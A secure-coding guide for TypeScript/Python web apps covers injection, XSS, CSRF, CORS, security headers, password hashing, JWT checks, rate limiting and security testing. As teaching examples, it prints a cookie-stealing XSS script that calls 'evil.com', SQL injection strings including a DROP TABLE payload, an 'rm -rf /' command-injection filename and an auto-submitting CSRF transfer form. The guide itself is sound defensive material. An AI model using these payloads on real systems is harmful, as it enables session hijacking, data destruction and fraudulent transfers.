# Security

## The Problem

Security isn't a feature you add — it's a property your system either has or doesn't. Most security vulnerabilities aren't sophisticated hacking. They're ordinary mistakes: a developer concatenates user input into a SQL query, forgets to escape HTML output, or commits an API key to git.

The OWASP (Open Web Application Security Project) Top 10 is the industry-standard list of the most critical web application security risks, updated every few years from real-world attack data. When a security auditor reviews your app, this is their starting checklist. This topic covers the attacks most relevant to the TypeScript/Python web apps you'll be building.

---

## Injection Attacks

An attacker sends malicious data that gets interpreted as code by your system.

### SQL Injection

The most well-known attack. User input is concatenated directly into a SQL query:

```python
# VULNERABLE: user input becomes part of the SQL command
query = f"SELECT * FROM users WHERE email = '{user_input}'"

# If user_input is: ' OR '1'='1
# Query becomes: SELECT * FROM users WHERE email = '' OR '1'='1'
# This returns ALL users — the attacker dumped your user table

# Even worse: user_input is: '; DROP TABLE users; --
# Query becomes: SELECT * FROM users WHERE email = ''; DROP TABLE users; --'
# Your users table is gone
```

**Prevention: parameterized queries (prepared statements).** The database treats the parameter as data, never as SQL code:

```python
# SAFE: parameter is data, not SQL
cursor.execute("SELECT * FROM users WHERE email = %s", (user_input,))
```

```typescript
// SAFE: parameterized query
const user = await db.query('SELECT * FROM users WHERE email = $1', [userInput]);
```

**ORMs (SQLAlchemy, Prisma, Drizzle) use parameterized queries by default.** But raw query methods (`.execute()`, `$queryRaw`, `Prisma.$queryRawUnsafe`) can still be vulnerable if you concatenate strings. If you must write raw SQL, always use the parameterized form.

### NoSQL Injection

Same concept, different database:

```python
# VULNERABLE: if user_input is a dict like {"$ne": null}, this matches ALL users
db.users.find({"email": user_input})
```

**Prevention:** Validate input types with your schema (Pydantic/Zod) before using it in queries. If `email` should be a string, Pydantic rejects a dict. This is where [Data Integrity](./data-integrity.md) and security intersect — schema validation at boundaries is a security defence.

### Command Injection

User input ends up in a shell command:

```python
# VULNERABLE
os.system(f"convert {user_filename} output.png")
# user_filename = "image.png; rm -rf /"
# Executes: convert image.png; rm -rf /
```

**Prevention:** Never pass user input to shell commands. Use library APIs instead. If you must use a subprocess, use array syntax and never `shell=True`:

```python
# SAFE: arguments are a list, not interpolated into a string
subprocess.run(["convert", user_filename, "output.png"], check=True)
# Even if user_filename contains special characters, they're treated as a filename
```

```typescript
// SAFE: arguments are an array
import { execFile } from 'child_process';
execFile('convert', [userFilename, 'output.png'], callback);
// NOT execSync(`convert ${userFilename} output.png`) — that's vulnerable
```

---

## XSS (Cross-Site Scripting)

An attacker injects JavaScript into your page that runs in other users' browsers.

### How It Works

Your app has a comments feature. An attacker posts:

```html
<script>fetch('https://evil.com/steal?cookie=' + document.cookie)</script>
```

If your app renders this without sanitizing, every user who views the page runs the attacker's JavaScript. The script sends their session cookie to the attacker, who can now impersonate them.

### Types

- **Stored XSS** — malicious script saved in your database (the comment example). Most dangerous — affects every user who views the page.
- **Reflected XSS** — malicious script in the URL: `yourapp.com/search?q=<script>...</script>`. Server includes the search term in the page without escaping.
- **DOM-based XSS** — Client-side JavaScript reads from `window.location` or `document.referrer` and inserts it into the DOM unsanitized.

### Prevention

**React escapes by default** — `{variable}` in JSX converts `<script>` to harmless text `&lt;script&gt;`:

```tsx
// SAFE: React auto-escapes — script tags become visible text, not executable code
<p>{comment.text}</p>

// DANGEROUS: dangerouslySetInnerHTML bypasses escaping — never use with user content
<p dangerouslySetInnerHTML={{ __html: comment.text }} />
```

**Server-rendered HTML (Jinja2, etc.):**

```python
# Jinja2 auto-escapes by default in Flask/FastAPI
# {{ user_input }} — auto-escaped (safe)
# {{ user_input | safe }} — DISABLES escaping (dangerous with user content)
```

**Additional protection:** Content-Security-Policy headers (see below) prevent inline scripts from executing even if they get injected.

---

## CSRF (Cross-Site Request Forgery)

An attacker tricks a logged-in user's browser into making a request to your app.

### How It Works

You're logged into your banking app. You visit a malicious page containing:

```html
<form action="https://yourbank.com/transfer" method="POST" style="display:none">
  <input name="to" value="attacker-account" />
  <input name="amount" value="10000" />
</form>
<script>document.forms[0].submit();</script>
```

Your browser automatically includes your bank's session cookie. The bank sees a valid session and processes the transfer. You didn't click anything — visiting the page was enough.

### Prevention

**CSRF tokens** — a random value in every form that the attacker can't guess:

```html
<form action="/transfer" method="POST">
  <input type="hidden" name="csrf_token" value="random-unguessable-value" />
  <!-- ... other fields ... -->
</form>
```

The server generates a unique token per session and rejects requests without it. The attacker can't read the token (same-origin policy prevents cross-origin reads).

**Modern APIs with Bearer tokens:** If your API uses `Authorization: Bearer <token>` headers instead of cookies, CSRF isn't a concern. The attacker's page can't set custom headers on cross-origin requests. CSRF is specifically a cookie-based authentication problem.

**Framework support:**
- **FastAPI:** Typically uses Bearer tokens, not cookies — CSRF not a concern
- **Next.js:** Server Actions include CSRF protection automatically
- **Express:** Use `csrf-csrf` middleware (`csurf` is deprecated)

---

## CORS (Cross-Origin Resource Sharing)

A browser mechanism that controls which websites can call your API.

By default, JavaScript on `frontend.com` cannot call `api.com`. The browser blocks it. CORS headers tell the browser which origins are allowed.

### Configuration

```typescript
// DANGEROUS: allows ANY website to call your API
app.use(cors({ origin: '*' }));

// DANGEROUS: reflects whatever origin the request came from
app.use(cors({ origin: true }));

// SAFE: explicitly list allowed origins
app.use(cors({
  origin: ['https://myapp.com', 'https://staging.myapp.com'],
  credentials: true,
}));
```

```python
from fastapi.middleware.cors import CORSMiddleware

app.add_middleware(
    CORSMiddleware,
    allow_origins=["https://myapp.com", "https://staging.myapp.com"],
    allow_credentials=True,
    allow_methods=["GET", "POST", "PUT", "DELETE"],
    allow_headers=["*"],
)
```

**When `*` is OK:** For truly public APIs with no authentication (public weather API, CDN). If your API requires auth or uses cookies, `*` is a security hole.

**Development:** You'll often need `http://localhost:3000` in your CORS origins during development. Make sure this doesn't leak into production config — use environment-specific CORS origins via your [Configuration](./configuration.md) setup.

### Preflight Requests (OPTIONS)

When the browser makes certain cross-origin requests, it first sends an OPTIONS request to ask "is this allowed?" before sending the actual request. This is called a **preflight**.

**What triggers a preflight:**
- Custom headers (e.g., `Authorization: Bearer ...`)
- HTTP methods other than GET, HEAD, or POST
- POST with a content type other than `application/x-www-form-urlencoded`, `multipart/form-data`, or `text/plain` (so `application/json` triggers a preflight)

Since most API calls use `Authorization` headers and `Content-Type: application/json`, **almost every API request triggers a preflight.**

**What happens:**
```
1. Browser sends: OPTIONS /api/users (preflight)
2. Server responds with CORS headers (allowed origins, methods, headers)
3. Browser checks the response — if allowed, sends the real request
4. Server responds to the real request
```

If your server doesn't handle OPTIONS requests, or doesn't include the right CORS headers in the OPTIONS response, the browser never sends the actual request — and you get a cryptic CORS error in the console.

**Most CORS middleware handles this automatically.** The `cors()` middleware in Express and `CORSMiddleware` in FastAPI both respond to OPTIONS requests correctly. The common mistake is adding CORS headers manually to your routes but forgetting to handle OPTIONS — use the middleware instead.

---

## Security Headers

HTTP headers that tell browsers to enable security features. In Node.js, one package adds sensible defaults:

### Node.js / Express — helmet

```typescript
import helmet from 'helmet';
app.use(helmet());
// Adds ~15 security headers with sensible defaults in one line
```

### FastAPI / Python

```python
@app.middleware("http")
async def security_headers(request, call_next):
    response = await call_next(request)
    response.headers["X-Content-Type-Options"] = "nosniff"
    response.headers["X-Frame-Options"] = "DENY"
    response.headers["Strict-Transport-Security"] = "max-age=31536000; includeSubDomains"
    response.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"
    response.headers["X-XSS-Protection"] = "0"  # disabled — CSP is the modern replacement
    return response
```

The manual `X-XSS-Protection: 0` mirrors what `helmet` sets by default — the header is deliberately *off* because the legacy browser XSS auditor it enabled was itself buggy and has been removed from modern browsers; CSP is the real protection.

### Key Headers

| Header | What it does | Why it matters |
|--------|-------------|----------------|
| `Strict-Transport-Security` | Forces HTTPS for all future requests | Prevents HTTP downgrade attacks |
| `Content-Security-Policy` | Controls what scripts/styles/images can load | Blocks XSS by preventing inline scripts and unauthorized sources |
| `X-Content-Type-Options: nosniff` | Prevents browsers from guessing content types | Stops browsers interpreting a text file as JavaScript |
| `X-Frame-Options: DENY` | Prevents your page from being embedded in an iframe | Prevents clickjacking attacks |
| `Referrer-Policy` | Controls what URL info is sent to external sites | Prevents leaking sensitive URL paths |

### Content-Security-Policy (CSP)

The most powerful and most complex security header. A basic policy:

```
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'
```

This says: only load scripts and resources from my own domain. No inline scripts (blocks most XSS). `'unsafe-inline'` for styles is a pragmatic compromise — many CSS frameworks need it.

CSP is often added incrementally: start with `Content-Security-Policy-Report-Only` (logs violations without blocking them), review the reports, then enforce.

---

## Password Hashing

If your app has user accounts with passwords, you must store them securely.

**Never store:**
- Plain text passwords
- MD5 hashes (broken, cracked instantly)
- SHA256 hashes (too fast — attackers try billions of guesses per second)

**Use bcrypt or argon2** — purpose-built password hashing algorithms that are intentionally slow (tunable) and include a salt (random data so identical passwords produce different hashes).

### TypeScript

```typescript
import bcrypt from 'bcrypt';

// During registration — hash the password
const saltRounds = 12;  // higher = slower = more secure (12 is a good default)
const hash = await bcrypt.hash(password, saltRounds);
// Store hash in database. NEVER store the plain password.

// During login — verify the password
const isValid = await bcrypt.compare(passwordAttempt, storedHash);
if (!isValid) throw new AuthenticationError("Invalid credentials");
```

### Python

```python
import bcrypt

# During registration
hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))
# Store hashed in database (it's a bytes object — decode to str if needed)

# During login
is_valid = bcrypt.checkpw(password_attempt.encode(), stored_hash)
if not is_valid:
    raise AuthenticationError("Invalid credentials")
```

### Why Salts Matter

Without a salt, every user with password "Password123" has the same hash. An attacker can precompute hashes for common passwords (a **rainbow table**) and look them up instantly.

With a salt, a random value is mixed into each hash. Identical passwords produce different hashes. Precomputation becomes useless.

bcrypt includes the salt automatically in the hash output — you don't manage it separately.

---

## Dependency Scanning

Your app's security is only as strong as its weakest dependency. A known vulnerability in a package you use is a known vulnerability in your app.

### Scanning Tools

```bash
# npm — built-in
npm audit
npm audit fix  # auto-fix where possible

# Python
pip-audit           # pip install pip-audit
safety check        # pip install safety
```

### Dependabot (GitHub, free)

Automatically creates PRs to update vulnerable dependencies. Enable in your repo settings (Security tab → Dependabot alerts → Enable). It monitors the GitHub Advisory Database and opens PRs when vulnerabilities are disclosed.

### Lockfile Integrity

Always commit your lockfile (`package-lock.json`, `poetry.lock`, `uv.lock`). In CI, use `npm ci` (not `npm install`) — it installs exactly what the lockfile says and fails if out of sync. This prevents supply chain attacks that tamper with dependency resolution.

### Typosquatting

Attackers publish packages with names like `lodsah` (misspelling of `lodash`). Before adding a dependency:
- Check download counts (legitimate packages have millions)
- Check maintenance status (last publish date, open issues)
- Spell the name carefully
- Prefer well-known packages over obscure alternatives

---

## Authentication vs Authorization

**Authentication** is "who are you?" (identity); **authorization** is "what are you allowed to do?" (permission). The classic, dangerous mistake is checking the first but not the second — an endpoint that confirms a caller is logged in but never checks they own the resource they're acting on, so any authenticated user can act on anyone's data. The three checks every sensitive endpoint owes (authenticated? authorised for *this resource*? authorised for *this action*?), the authorization models behind them (RBAC, ABAC, ReBAC), enforce-server-side, 401-vs-403, and the implementation mechanics (OIDC flows, JWT verification with JWKS, session strategies) are all covered in depth in [Authentication & Authorization](./authentication-authorization.md) — the canonical reference.

From a security standpoint, a few JWT-specific concerns are worth double-checking on your verifier because they're common attack surfaces:

- **Pin allowed algorithms explicitly.** `jwt.verify(token, key)` in some libraries historically accepted `alg: "none"` tokens — unsigned tokens that any attacker could forge. Always pass an explicit `algorithms: ["RS256"]` (or whichever you actually use) to the verifier.
- **Validate `iss` and `aud`.** A token issued for Service A can be replayed against Service B if Service B doesn't check the audience. A token issued by a dev-environment IdP can be replayed against production if the issuer isn't validated.
- **Check `exp`.** Libraries generally do this by default, but flags that disable expiry checking exist — don't use them.
- **Never put secrets in the payload.** JWTs are signed, not encrypted. Anyone who captures the token (from a log, a referer, a browser extension) can base64-decode the payload. Put identifiers there, not credentials or PII.

---

## Rate Limiting

Rate limiting restricts how many requests a client can make in a time window. Without it, a single client (or bot, or attacker) can overwhelm your API.

### Why You Need It

- **Abuse prevention** — stops bots from brute-forcing login, scraping data, or flooding your API
- **Fair usage** — prevents one heavy user from degrading the service for everyone else
- **Cost protection** — if your API calls paid services (AI models, payment processors), an unrestricted client can run up your bill
- **DDoS mitigation** — rate limiting alone doesn't stop a distributed attack, but it reduces the impact

### Common Strategies

**Per-user / per-API-key:** "100 requests per minute per authenticated user." The most common approach. Identified users or API keys get individual limits.

**Per-IP:** "50 requests per minute per IP address." Useful for unauthenticated endpoints (login, signup). Less reliable because many users can share an IP (corporate NATs, VPNs).

**Per-endpoint:** Different limits for different endpoints. A search endpoint might allow 60/min, while a payment endpoint might allow 10/min.

### Implementation

Most frameworks have rate limiting middleware or libraries. You don't implement the algorithm yourself.

**Express (TypeScript):**
```typescript
import rateLimit from 'express-rate-limit';

const limiter = rateLimit({
  windowMs: 60 * 1000,    // 1-minute window
  max: 100,                // 100 requests per window per IP
  standardHeaders: true,   // Return rate limit info in `RateLimit-*` headers
  message: {
    type: "RateLimitError",
    title: "Too many requests",
    status: 429,
  },
});

app.use('/api/', limiter);
```

**FastAPI (Python):**
```python
from slowapi import Limiter
from slowapi.util import get_remote_address

limiter = Limiter(key_func=get_remote_address)
app.state.limiter = limiter

@app.get("/api/search")
@limiter.limit("60/minute")
async def search(request: Request, query: str):
    ...
```

### The 429 Response

When a client exceeds the rate limit, return HTTP 429 (Too Many Requests) with a `Retry-After` header telling the client when to try again:

```
HTTP/1.1 429 Too Many Requests
Retry-After: 30
RateLimit-Limit: 100
RateLimit-Remaining: 0
RateLimit-Reset: 1680000060
```

This connects to [Resilience](./resilience.md) — well-behaved clients read the `Retry-After` header and wait before retrying.

---

## Secrets Management

Covered in detail in [Configuration](./configuration.md), but the security perspective adds:

- **Never commit secrets to git.** Even deleted secrets live in git history forever. Bots scan GitHub for exposed keys and exploit them within minutes.
- **Rotate secrets regularly.** If a key is compromised, rotate immediately. Some teams rotate all keys quarterly as a practice.
- **Use a secret manager in production.** AWS Secrets Manager, HashiCorp Vault, or your cloud provider's equivalent. Not environment variables set manually on servers.
- **Least privilege.** API keys should have minimum permissions needed. A read-only key shouldn't have write access. A key for one service shouldn't access another.
- **Never log secrets.** Check that your structured logging doesn't accidentally include config objects containing API keys. Scrub sensitive fields before logging.

---

## Authorization Models

Once a caller is authenticated, you need a consistent model for what they can do — RBAC, ABAC, ReBAC, and policy engines, the three-check rule, and 401-vs-403 are covered in depth in [Authentication & Authorization](./authentication-authorization.md). Two consequences are worth flagging from a security standpoint:

- **A hidden button is not a control.** Authorization must be enforced on the server; client-side checks only hide UI. If the UI hides an action but the endpoint doesn't re-check permission, there's no security — just a hidden element.
- **Elevated functions must verify the caller's scope.** A stored procedure, serverless function, or service-account endpoint that runs with more privilege than its caller must independently authorise the caller for any scope parameter it accepts — otherwise any caller reaches any scope by changing it (the Confused Deputy pattern).

### Multi-tenant isolation

When one instance serves many customer organisations, every authorization decision also has to ask "*for which tenant?*" — and the tenant identity must come from the authenticated session, never the request. The full treatment of isolation strategies, scoped data layers, and the database backstop lives in [Multi-Tenant Isolation](./multi-tenant-isolation.md).

---

## Testing Security

Security is the concern where a passing test most easily lies, because the dangerous behaviour is a *missing* check that nothing exercises. The discipline is to prove the negative — assert the attack is refused, against a live request path rather than the function you hope is wired in:

- **Authentication gate.** An unauthenticated request to a protected route must be rejected (401), proving the gate is actually in front of the route.
- **Authorization (ownership).** An authenticated caller asking for a resource they don't own must be refused (403) — this catches the classic authenticated-but-not-authorized mistake. It must hit the server: a hidden button is not a control, so a test that only checks the UI proves nothing.
- **Injection held.** Drive a hostile payload (`'; DROP TABLE ...; --`) through the real endpoint and assert two things — it's handled safely (rejected or empty results, never a 500 leaking a database error) *and* the table still exists afterward. The surviving table is the real assertion: it proves parameterized queries held, which a function-level mock can't demonstrate.
- **No leakage to an attacker.** An error response must not leak source-file paths (`.ts:`/`.py:`) or other implementation detail. (The broader "unknown error becomes a safe 500 with no stack trace" guarantee is [Error Handling](./error-handling.md)'s to verify — reference it rather than re-asserting it here.)

These hit a real request path and a real database engine, not mocks — see [Testing](./testing.md) for the real-database setup and the request/handler harness.

---

## Anti-Patterns

| Don't | Do Instead | Why |
|-------|-----------|-----|
| Concatenate user input into SQL/commands | Use parameterized queries and array-based subprocess calls | Injection attacks — the #1 security risk |
| Use `dangerouslySetInnerHTML` with user content | Let React/template engine auto-escape | XSS — attacker runs JS in your users' browsers |
| Set `Access-Control-Allow-Origin: *` with auth | Explicitly list allowed origins | Any website can call your authenticated API |
| Skip security headers | Use `helmet` (Node.js) or set headers in middleware | Missing headers leave browser protections disabled |
| Store passwords as plain text or MD5/SHA256 | Use bcrypt or argon2 with salt rounds of 12+ | Weak hashing means stolen databases are cracked in minutes |
| Check authentication but not authorization | Always verify the user has permission for the specific resource and action | Authenticated doesn't mean authorized — user A shouldn't access user B's data |
| Commit `.env` files to git | Add to `.gitignore`, use `.env.example` for documentation | Secrets in git history are exploited by automated scanners |
| Ignore `npm audit` / `pip-audit` warnings | Run audit in CI, fix vulnerabilities promptly | Known vulnerabilities in dependencies are the easiest attack vector |
| Use `shell=True` in subprocess calls (Python) | Use array syntax: `subprocess.run(["cmd", arg1, arg2])` | `shell=True` enables command injection |
| Return detailed error messages to clients in production | Return generic messages, log details server-side | Stack traces and SQL errors leak internal details to attackers |

---

## Deciding for Your Project

When starting a new project, determine:

1. **Does your app have user accounts?** If yes → you need authentication, authorization, password hashing, CSRF protection (if using cookies).
2. **Does your app accept user input?** If yes (and it almost always does) → you need input validation (see [Data Integrity](./data-integrity.md)), XSS protection, injection prevention.
3. **Does your app have an API?** If yes → you need CORS configuration, security headers, consistent error responses that don't leak internals.
4. **What sensitive data do you handle?** This determines your security posture — a todo app has different requirements than a payment system.
5. **What's your authentication method?** Cookie-based (needs CSRF tokens), Bearer token (simpler, no CSRF concern), OAuth (delegated to a provider like Auth0, Clerk).

---

## Related Topics

- **Input validation as security** — see [Data Integrity](./data-integrity.md) for schema validation at boundaries, which is the first line of defence against injection
- **Error responses and information leakage** — see [Error Handling](./error-handling.md) for why you must never expose stack traces or internal error details
- **Secrets in configuration** — see [Configuration](./configuration.md) for .env management, secret managers, and the fail-fast pattern
- **Dependency management** — see [Deployment](./deployment.md) for lockfile integrity and supply chain security in CI/CD
- **Logging and secrets** — see [Logging](./logging.md) for ensuring sensitive data is scrubbed from logs
- **Multi-tenant isolation** — see [Multi-Tenant Isolation](./multi-tenant-isolation.md) for tenant scoping, the RLS backstop, and cross-tenant access paths
- **Authorization models, RBAC/ABAC, and enforcement** — see [Authentication & Authorization](./authentication-authorization.md), the canonical reference for the authz model
- **Testing security** — see [Testing](./testing.md) for the real-database setup the authn/authz, injection, and information-leakage tests need
